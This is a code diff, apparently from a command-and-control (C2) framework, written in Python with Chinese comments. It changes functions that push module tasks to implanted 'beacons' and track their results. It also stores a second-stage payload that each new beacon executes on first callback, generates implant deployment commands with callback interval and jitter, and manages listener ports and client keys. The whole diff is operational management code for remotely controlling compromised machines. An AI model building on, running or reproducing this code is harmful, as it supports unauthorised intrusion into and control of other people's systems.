@@ -333,24 +333,34 @@ def build_module_task(name: str, args: list, platform: str = ""):
 
 def exec_module_to_beacon(client_id: str, name: str, args: list):
     """按 beacon 平台构建模块任务并下发。返回 (ok, message)。"""
+    ok, task, msg = exec_module_task(client_id, name, args)
+    return ok, msg
+
+
+def exec_module_task(client_id: str, name: str, args: list):
+    """按 beacon 平台构建模块任务并下发,同时返回 Task 对象(结果追踪用)。
+
+    返回 (ok, task, message):task 为 Task 或 None(供调用方按 task_id
+    精确匹配回传结果——结果计数基准在多任务并发/结果窗口滑动时会错认)。
+    """
     server = get_c2()
     if not server:
-        return False, "C2 未启动"
+        return False, None, "C2 未启动"
     client_id = str(client_id or "").strip()
     with _C2_LOCK:
         rec = server._mgr.get_client(client_id)
         if not rec:
-            return False, f"beacon 不存在: {client_id or '(空)'}"
+            return False, None, f"beacon 不存在: {client_id or '(空)'}"
         try:
             task = server._dispatcher.build_task_for(client_id, name, list(args or []))
             if task is None:
-                return False, f"模块 {name} 不存在"
+                return False, None, f"模块 {name} 不存在"
             msg = server._dispatcher.push_task(client_id, task)
-            return True, msg
+            return True, task, msg
         except ValueError as exc:
-            return False, str(exc)
+            return False, None, str(exc)
         except Exception as exc:
-            return False, str(exc)
+            return False, None, str(exc)
 
 
 def _modules_dir() -> str:
@@ -503,8 +513,74 @@ def set_auto_commands(commands: list):
 
 def _config_path_of(server) -> str:
     """server 的 config.json 绝对路径。"""
-    return (getattr(server._config, "config_path", "") or
-            os.path.join(getattr(server._config, "base_dir", "") or "", "config.json"))
+    path = getattr(getattr(server, "_config", None), "config_path", "") or ""
+    if not path:
+        base = getattr(getattr(server, "_config", None), "base_dir", "") or _C2_PROJECT_ROOT
+        path = os.path.join(base or "", "config.json")
+    return os.path.abspath(path)
+
+
+def _atomic_save_json(path: str, raw: dict) -> None:
+    """原子写 json(2026-09-04 B15): 临时文件 + os.replace——防与 server
+    console(stage/reload/keygen)并发写 config.json 撞出半截 JSON。"""
+    tmp = path + ".tmp"
+    with open(tmp, "w", encoding="utf-8") as f:
+        json.dump(raw, f, indent=2, ensure_ascii=False)
+    os.replace(tmp, path)
+
+
+def get_stage2() -> str:
+    """当前二阶段载荷源码(明文); 未设置返回空串。"""
+    server = get_c2()
+    if not server:
+        # C2 停止时读 config.json 落盘值(此前恒返空, 界面看不到已设的
+        # stage_code——2026-09-04 B15)
+        path = ""
+        if _C2_PROJECT_ROOT:
+            cand = os.path.join(_C2_PROJECT_ROOT,
+                                str(_C2_CONFIG_FILE or "config.json"))
+            if os.path.isfile(cand):
+                path = cand
+        if not path:
+            return ""
+        try:
+            with open(path, "r", encoding="utf-8") as f:
+                raw = json.load(f)
+            return str(raw.get("stage_code", "") or "")
+        except (OSError, ValueError):
+            return ""
+    with _C2_LOCK:
+        return getattr(server._config, "stage_code", "") or ""
+
+
+def set_stage2(code: str) -> dict:
+    """保存二阶段载荷: 更新运行中 config + 持久化 config.json(stage_code)。
+
+    保存后新 beacon 首次回连即收到该载荷(init 任务 exec), 立即生效无需 reload。
+    """
+    server = get_c2()
+    if not server:
+        return {"ok": False, "error": _C2_INIT_ERROR or "C2 未启动"}
+    code = str(code or "")
+    if len(code) > 400000:
+        return {"ok": False, "error": "二阶段载荷过大(超过 400KB)"}
+    with _C2_LOCK:
+        server._config.stage_code = code
+        path = _config_path_of(server)
+        saved = False
+        if path:
+            try:
+                with open(path, "r", encoding="utf-8") as f:
+                    raw = json.load(f)
+                raw["stage_code"] = code
+                _atomic_save_json(path, raw)
+                saved = True
+            except (OSError, ValueError) as e:
+                return {"ok": False,
+                        "error": f"config.json 持久化失败: {e}(运行中已生效, 重启后丢失)"}
+        return {"ok": True,
+                "message": f"二阶段载荷已保存({len(code)} 字节); "
+                           f"新 beacon 首次回连下发"}
 
 
 def status_detail() -> dict:
@@ -528,7 +604,6 @@ def status_detail() -> dict:
                 "client_port": cfg.client_port,
                 "client_tls": bool(getattr(cfg, "client_tls", False)),
                 "client_timeout": cfg.client_timeout,
-                "exec_timeout": cfg.exec_timeout,
                 "beacon_expire_seconds": cfg.beacon_expire_seconds,
                 "max_tasks_per_client": cfg.max_tasks_per_client,
                 "max_results_per_beacon": cfg.max_results_per_beacon,
@@ -537,8 +612,10 @@ def status_detail() -> dict:
             "implant_key_fp": key_implant.hex()[:8] + "…" + key_implant.hex()[-8:] if key_implant else "",
             "client_key_ready": bool(getattr(server, "_key_client", b"")),
             "listeners": {
-                "beacon": {"enabled": True, "port": cfg.server_port},
-                "client": {"enabled": True, "port": cfg.client_port, "ready": bool(getattr(server, "_key_client", b""))},
+                # enabled = 端口 > 0(端口 0 = 关闭该通道,2026-09-04)
+                "beacon": {"enabled": cfg.server_port > 0, "port": cfg.server_port},
+                "client": {"enabled": cfg.client_port > 0, "port": cfg.client_port,
+                           "ready": bool(getattr(server, "_key_client", b""))},
             },
             "counts": {
                 "beacons": len(beacons),
@@ -549,16 +626,32 @@ def status_detail() -> dict:
 
 
 def generate_client_key():
-    """一键生成 client_key(s_exec keygen)。返回 (ok, message)。"""
+    """一键生成 client_key(s_exec keygen)。返回 (ok, message)。
+
+    keygen 模块只写 config.json;运行中 server 的 _key_client 在 __init__
+    时注入、不重启不更新——不重启则 client 通道仍用旧(空)密钥,状态栏
+    一直显示"未生成",远程模式用新 key 连 client 端口必然握手失败。
+    故生成成功后自动 restart C2 立即生效(beacon 短暂掉线自动重连)。
+    """
     server = get_c2()
     if not server:
         return False, _C2_INIT_ERROR or "C2 未启动"
     with _C2_LOCK:
         try:
             out = server._dispatcher.execute("s_exec keygen")
-            return True, out
         except Exception as exc:
             return False, str(exc)
+    try:
+        parsed = json.loads(out) if str(out).strip().startswith("{") else {}
+    except Exception:
+        parsed = {}
+    if parsed.get("status") != "ok":
+        msg = parsed.get("message") if parsed else str(out)
+        return False, msg or "keygen 失败"
+    ok, rmsg = restart_c2()
+    if not ok:
+        return False, f"keygen 成功但 C2 重启失败: {rmsg}"
+    return True, "client_key 已生成, C2 已重启生效(beacon 将自动重连)"
 
 
 def beacon_detail(client_id: str) -> dict:
@@ -650,18 +743,27 @@ def build_deploy(host: str, port: int, interval: int = 60, jitter: float = 0.2) 
         return {"ok": False, "error": _C2_INIT_ERROR or "C2 未启动"}
     with _C2_LOCK:
         try:
-            res = server._smods.run("build", [str(host), str(port), "", str(interval), str(jitter), ""])
+            # run_structured: 原样取 build 模块 dict 结果(SModuleLoader.run
+            # 会把 dict JSON 序列化成文本,deploy 段还被移出,结构化消费方
+            # 无法还原——2026-09-04 修复)
+            res = server._smods.run_structured(
+                "build", [str(host), str(port), "", str(interval), str(jitter), ""])
         except Exception as exc:
             return {"ok": False, "error": str(exc)}
     if not isinstance(res, dict) or res.get("status") != "ok":
         msg = res.get("message") if isinstance(res, dict) else str(res)
         return {"ok": False, "error": msg or "build 失败"}
+    key = str(res.get("key", "") or "")
+    key_fp = f"{key[:8]}…{key[-8:]}" if len(key) == 64 else ""
+    files = res.get("files") or {}
+    cmd_file = files.get("command") or ""
     return {
         "ok": True,
         "deploy": res.get("deploy", ""),
-        "key_fp": res.get("key_fp", "") or res.get("fingerprint", ""),
-        "note": res.get("note", ""),
-        "file": res.get("file", ""),
+        "mode": res.get("mode", ""),
+        "key_fp": key_fp,
+        "note": res.get("stage2", ""),
+        "file": cmd_file,
     }
 
 
@@ -697,15 +799,22 @@ def export_events(client_id: str = "", limit: int = 2000) -> list:
 
 
 def update_listener_config(updates: dict) -> tuple:
-    """更新 config.json 的监听/密钥配置(写回磁盘;server 侧生效需 restart)。"""
+    """更新 config.json 的监听/密钥配置(写回磁盘;server 侧生效需 restart)。
+
+    端口 0 = 关闭该通道(server 已实现:validate 放行 0,启动时端口 0 不 bind
+    ——2026-09-04 修复);端口越界/非数字直接报错,不再静默忽略。
+    interval/jitter 非 ServerConfig 字段(写盘被 load_config 忽略的死配置),
+    已从白名单移除——回连节奏请在部署生成时指定或对在线 beacon 用
+    set_interval 模块(2026-09-04)。
+    """
     server = get_c2()
     if not server:
         return False, _C2_INIT_ERROR or "C2 未启动"
     cfg_path = _config_path_of(server)
     allowed = {"server_host", "server_port", "client_port", "client_tls",
-               "client_timeout", "exec_timeout", "beacon_expire_seconds",
-               "interval", "jitter",
+               "client_timeout", "beacon_expire_seconds",
                "max_tasks_per_client", "max_results_per_beacon"}
+    port_keys = {"server_port", "client_port"}
     with _C2_LOCK:
         try:
             with open(cfg_path, "r", encoding="utf-8") as f:
@@ -718,24 +827,30 @@ def update_listener_config(updates: dict) -> tuple:
                 continue
             try:
                 if isinstance(v, str) and v.strip() == "":
-                    v = 0 if k.endswith("_port") else v
-                if k in ("client_tls",):
-                    v = bool(v)
-                elif k in ("server_port", "client_port",
-                           "client_timeout", "exec_timeout",
+                    v = 0 if k in port_keys else v
+                if k == "client_tls":
+                    # 字符串布尔兜底(bool("false") == True 陷阱)
+                    if isinstance(v, str):
+                        v = v.strip().lower() in ("1", "true", "yes", "on")
+                    else:
+                        v = bool(v)
+                elif k in port_keys:
+                    v = int(v)
+                    if not (0 <= v <= 65535):
+                        return False, f"{k}: 端口须在 0-65535(0=关闭该通道),收到 {v!r}"
+                elif k in ("client_timeout", "beacon_expire_seconds",
                            "max_tasks_per_client", "max_results_per_beacon"):
                     v = int(v)
-                elif k in ("jitter",):
-                    v = float(v)
             except (TypeError, ValueError):
+                if k in port_keys:
+                    return False, f"{k}: 端口须为数字(0=关闭该通道),收到 {v!r}"
                 continue
             if raw.get(k) != v:
                 raw[k] = v
                 changed.append(k)
         if not changed:
             return True, "无变更(配置已一致)"
-        with open(cfg_path, "w", encoding="utf-8") as f:
-            json.dump(raw, f, indent=2, ensure_ascii=False)
+        _atomic_save_json(cfg_path, raw)
         return True, f"已写入 config.json: {', '.join(changed)}（重启 C2 生效）"
 
 
